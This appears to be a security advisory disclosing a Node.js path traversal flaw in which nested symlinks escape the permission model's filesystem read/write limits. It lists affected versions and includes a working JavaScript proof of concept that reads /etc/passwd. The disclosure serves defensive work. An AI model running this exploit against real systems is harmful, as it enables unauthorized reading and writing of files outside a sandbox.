## Summary

A path traversal vulnerability in Node.js allows a user to break out of the FS permissions restrictions and gain read/write access to unintended files.

## Component

Node.js

## Affected versions

[20.0.0,20.20.0)

[22.0.0,22.22.0)

[24.0.0,24.13.0)

[25.0.0,25.3.0)

## Description

Node.js allows users to restrict the access of a process to the system resources by defining `--allow-fs-read` and `--allow-fs-write`.

It was found that if the user is granted read/write permissions in the current directory, it is possible to manipulate the process and break out of the allowed folder using a local symlink as part of path resolution, granting the user access to files outside of the intended scope.

The vulnerability affects applications using the `--permission` module with the `--allow-fs-read` or `--allow-fs-write` flags.

An example of vulnerable usage of Node.js:

```
node --permission --allow-fs-read=. --allow-fs-write=. poc.js
```




## PoC

We will use the fact that file permissions and path resolved are being checked separately, and after approving the file permission - any action will be authorized.
We will create authorized symlinks, but arrange them in a manner that will be resolved into unauthorized paths! (each created subdirectory allows us to traverse one more directory outside of the allowed path)

```javascript
const fs = require('fs');
fs.mkdirSync('pwned1');
fs.mkdirSync('pwned1/pwned2');
fs.mkdirSync('pwned1/pwned2/pwned3');
fs.mkdirSync('pwned1/pwned2/pwned3/pwned4');
fs.mkdirSync('pwned1/pwned2/pwned3/pwned4/pwned5');
fs.mkdirSync('pwned1/pwned2/pwned3/pwned4/pwned5/pwned6');
fs.mkdirSync('pwned1/pwned2/pwned3/pwned4/pwned5/pwned6/pwned7');
var ALLOWED_SUB_FOLDERS = './pwned1/pwned2/pwned3/pwned4/pwned5/pwned6/pwned7'
fs.symlinkSync(
	__dirname,
	 ALLOWED_SUB_FOLDERS + '/gotcha');
console.log(fs.readFileSync(ALLOWED_SUB_FOLDERS+'/gotcha'+'/../../../../../../etc/passwd', 'utf8'));

```



We will run this script with the following command, and view how the content of “/etc/passwd” being printed to console:

```
node --permission --allow-fs-read=. --allow-fs-write=. poc.js
```
